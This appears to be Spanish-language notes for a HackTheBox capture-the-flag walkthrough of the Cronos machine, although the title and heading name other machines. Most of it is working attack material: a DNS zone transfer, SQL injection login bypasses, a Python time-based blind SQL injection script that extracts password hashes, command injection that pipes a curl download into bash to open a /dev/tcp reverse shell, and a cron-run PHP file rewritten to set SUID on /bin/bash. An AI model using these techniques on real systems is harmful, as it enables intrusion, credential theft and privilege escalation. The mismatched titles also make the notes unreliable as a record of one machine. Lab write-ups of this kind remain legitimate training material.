---
title: HackTheBox - Shocker-"sorpresa"
date: 2022-09-17 20:00:00 +/- 0000
categories: [HackTheBox,Medium]
author: Edwin Rodriguez
tags: [Shocker,android,anbox]
image: /assets/img/Icons/shocker.png
---

# RouterSpace
---
Initial configuration for this machine was very annoying, but once i got anbox working correctly it was rather straight forward. 
---
## Recon

z Cronos .13

writeup
https://s4vinotes.michellopez.org/cronos.html  s4vinotes

https://davidhamann.de/2020/02/02/htb-writeup-cronos/


youtube
https://www.youtube.com/watch?v=kBw3UyBt7Hc  Srvitar
https://www.youtube.com/watch?v=CYeVUmOar3I  IPPSEC





nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.13 -oG allPorts  
extractPorts allPorts 
nmap -sC -sV -p22,53,80 10.10.10.13 -oN targeted


Puerto	Servicio	Que se nos occure?	                     Que falta? 
22	ssh	       Conneccion directa	                 usuario y contraseña 
53	Domain	       AXFR - Ataque de transferencia de zona	  Conocer algun dominio 
80	http	       Web, Fuzzing



nmap -sC -sV -p22,53,80 10.10.10.13 -oN targeted

PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) 
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) 
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux) 
| dns-nsid:  
|_  bind.version: 9.10.3-P4-Ubuntu 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 
|_http-title: Apache2 Ubuntu Default Page: It works 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

revisamos que es un ubuntu 
 xenial-security





Nada interesante 


Lanzamos un web scan con nmap.  // no encontramos nada    

nmap --script http-enum -p80 10.10.10.143 -oN webScan


wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.13/FUZZ
como vemos que no encontro nada  haremos lo siguiente

por cada linea probara las dos extensiones php y html pero el comando no arranca investigar que podria ser
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-html http://10.10.10.13/FUZZ.FUZZZ



Analyzando los dominios


Como el puerto 53 esta abierto vamos a ver si podemos recuperar dominios connslookup
server 10.10.10.13
10.10.10.13    


agregarlo al hosts  
pluma /etc/hosts

ns1.cronos.htb

agregarlo al hosts  




wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://http://Z

Encontramos las siguientes extensiones
                                                              
000000550:   301        9 L      28 W       306 Ch      "css"                                                            
000000953:   301        9 L      28 W       305 Ch      "js"



Vemos que esta basado en el lenguaje php lo cual haremos fuzing en php
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://cronos.htb/FUZZ,php   -- no sale nada solo un index.php

Aunque el nombre de dominio inicial debe adivinarse ( cronos.htb ), es posible enumerar los subdominios restantes haciendo una transferencia de zona. Esto se puede lograr con el comando busque axfr @10.10.10.13 cronos.htb después de agregar cronos.htb al archivo /etc/hosts.

dig @10.10.10.13 cronos.htb ns  -- name server --
dig @10.10.10.13 cronos.htb mx  -- servidores de correo -- el cual resuelve --admin.cronos.htb.
dig @10.10.10.13 cronos.htb axfr  -- con el parametro axfr resuelve todos los subdominios --

dig  axfr @10.10.10.13 cronos.htb  
admin.cronos.htb.	604800	IN	A	10.10.10.13
  


SQL Injection
En el UserName si le ponemos la injeccion SQL basica ' or 1=1-- - y le damos a submit, entramos directamente en el panel de administracion.
Como sabemos que esta vulnerable a injeccion SQL, probamos differentes cosas porque lo que nos interesa es tener usuarios y contrañas.


' order by 100-- - 
' or sleep(5)-- -


Vemos que no esta vulnerable a unError Based SQL Injectionpero lo es a unTime Based SQL Injection. 

admin' or sleep(5)-- - 
admin' and sleep(5)-- -

Con estos comandos, comprobamos que el usuario admin existe.
Creamos un script en python para encontrar las informaciones con un Time Based SQL Injection

Time Based SQL Injection Autopwn
Buscamos en nombre de la database


#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")

    password = ""

    for user in range(0, 4):
        for position in range(1, 50):
            for character in s:
                p1.status("PosiciÃ³n nÃºmero %d de la extracciÃ³n de contraseÃ±a del usuario admin | Caracter %c" % (position, character))
                post_data = {
                    'username': "admin' and if(substr((select password from users limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (user, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    password += character
                    p2.status(password)

if __name__ == '__main__':

    makeRequest()


Aqui vemos que es un hash MD5 y passamos por rainbow tables para crackear la contraseña.
https://www.md5hashgenerator.com/



4f5fffa7b2340178a716e3832451e058

desencryptar = 1327663704

Utilizando la web
La pagina web permite enviar ping a maquinas. Lo intentamos contra nuestra maquina de atacante.
En la maquina de atacante
tcpdump -i tun0 icmp -n

tcpdump -i tun3 icmp -n

Lanzamos por la web un ping a la 10.10.14.18
Y recibimos la traza.

Miramos si la web esta bien sanitizada mirando si poniéndole 10.10.14.18;  whoami no salimos del contexto y es el caso. Vamos a ganar accesso al system 


Ponemos un servidor en escucha 

python3 -m http.server 80

Creamos un archivo en la carpeta  /content  llamado index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.18/443 0>&1

Colocamos el siguiente comando en la pagina web 

10.10.14.18; curl 10.10.14.18 | bash

mientras tanto en la otra terminal de mi parrot colocamos nc -nlvp 443
nc -nlvp 443

como en la siguiente imagen 

resumen
tcpdump -i tun3 icmp -n
python3 -m http.server 80
nc -nlvp 443

Pagina web colocamos el siguiente comando

10.10.14.18; curl 10.10.14.18 | bash
Vuln exploit & Gaining Access

Autopwn

Si lanzamos en script ganamos accesso al systema.

whoami 
www-data

Tratamiento de la TTY

script /dev/null -c bash 
^Z 
stty raw -echo; fg 
-> reset 
-> xterm 
export TERM=xterm 
export SHELL=bash 
stty -a 
stty rows <rownb> columns <colnb>


Tenemos que ver si tenemos que hacer un user pivoting pero como ya tenemos accesso a la flag, no es necessario.
Privilege Escalation
Rootear la maquina

cd /root 
id 
sudo -l 
uname -a 
lsb_release -a 
find \-perm -4000 2>/dev/null

Encontramos la flag en la siguiente carpeta.

/home/noulis




Aqui no hay nada interesante, vamos a enumerar el systema por tareas cron
Nos vamos a la raiz con el comando cd / para buscar privilegios SUID
find \-perm -4000 2>/dev/null

No vemos ningun interesante asi que miramos si guiene get cap con el siguiente comando 
which getcap
/sbin/getcap

no vemos nada interesante asi que veremos si hay algun comando con crontab
el siguiente comando para ver procesos es el siguiente 
cat /etc/crontab


vemos el siguiente root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
vemos el archivo 
ls -l php /var/www/laravel/artisan


Borramos EL ARCHIVO /var/www/laravel/artisan para colocar código malicioso y tener acceso 

vamos en el minuto  2:11 
www-data@cronos:/$
cd /dev/shm 
ls 
touch procmon.sh 
chmod +x procmon.sh 
nano procmon.sh

#!/bin/bash 
old_process=$(ps -eo command) 
while true; do 
    new_process=$(ps -eo command) 
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command" 
    old_process=$new_process 
done


./procmon.sh resultado  


otra opción es usas pspy
https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0  descarga la version 64 casilla 3
lo descargas lo pasas a la carpeta exploit y cambias el nombre a pspy y lo transfieres a la maquina remoto 
python3 -m http.server 4646
lo descargar en la maquina victima
wget http://10.10.14.18:4646/pspy
das permisos de ejecución y lo ejecutas con la siguiente comando 
lo ejecutamos,  ./pspy

 vemos que el pid que ejecuta es el 3076 
Entonces eliminamos 
rm /var/www/laravel/artisan
nano /var/www/laravel/artisan
asignacion del privilegio SUID  a la bash
<?php  
    system("chmod u+s /bin/bash");  
?>
revisamos  ls -l /bin/bash


watch -n 1 ls -l /bin/bash


se convierte en S 

con el comando bash -p es para que atienda el comando del propietario 
bash -p 
cd /root 
vemos la flag 


Y lo ejecutamos. Vemos que hay una tarea que ejecuta un script llamado artisan en php. Haciendole unls -lnos damos cuenta que el proprietario del script es www-data. Imaginamos que el que lanza el script es root. vamos a modificar el script.

<?php 
    system("chmod 4755 /bin/bash"); 
?>


Esperamos que la tarea se ejecute conwatch -n 1 ls -l /bin/bashy pasa a ser SUID

bash -p 
whoami 
root 
© 2021 - Lo0pInG 404 [michellopez.org]


Investigar 
puerto 53 
Puerto 53: Es usado por el servicio de DNS, Domain Name System.
dig 
dig es una herramienta para realizar consultas a los servidores DNS para solicitar información sobre direcciones de host, intercambiadores de correo, servidores de nombres e información relacionada. Dicha herramienta puede ser utilizada desde cualquier Linux ( Unix ) o desde los sistemas operativos Mac OS X
axfr
Las Transferencias de zona dns, a veces llamadas AXFR por el tipo de solicitud, es un tipo de transacción de DNS. Es uno de varios mecanismos disponibles para administradores para replicar bases de datos DNS a través de un conjunto de servidores DNS.​
El parámetro “axfr” es quien permite la transferencia de zona de dicho DNS, ya que se usa para sincronizar y actualizar datos de la zona cuando se produjeron cambios. Si bien la transferencia puede hacerse vía “axfr”, también es posible hacerla de forma incremental, denominada entonces “ixfr” -cuando se ejecuta la solicitud se obtiene la transferencia de toda la zona como respuesta. Sin la debida configuración, esto le permite a un atacante replicar la base de datos DNS, obteniendo información sensible.
 ' or 1=1-- -

MD5 Hash
¿Qué es un hash MD5?
Un hash MD5 se crea tomando una cadena de cualquier longitud y codificándola en una huella digital de 128 bits. La codificación de la misma cadena con el algoritmo MD5 siempre dará como resultado la misma salida hash de 128 bits. Los hashes MD5 se usan comúnmente con cadenas más pequeñas cuando se almacenan contraseñas, números de tarjetas de crédito u otros datos confidenciales en bases de datos como el popular MySQL. Esta herramienta proporciona una forma rápida y sencilla de codificar un hash MD5 a partir de una cadena simple de hasta 256 caracteres de longitud.
ps -eo command
ps ("process status", estado de procesos en idioma inglés) es un comando asociado en el sistema operativo UNIX (estandarizado en POSIX y otros) que permite visualizar el estado de un Proceso (informática).
Artisan 
es una herramienta de línea de comandos que viene con el marco PHP Laravel. Si bien podríamos simplemente agregar nuestro propio contenido al archivo para abrir otro shell inverso (por ejemplo fsockopen("10.10.14.38",1234); exec("/bin/sh -i <&3 >&3 2>&3");, ), veamos si podemos hacerlo de una manera más agradable sin destruir a los artesanos.
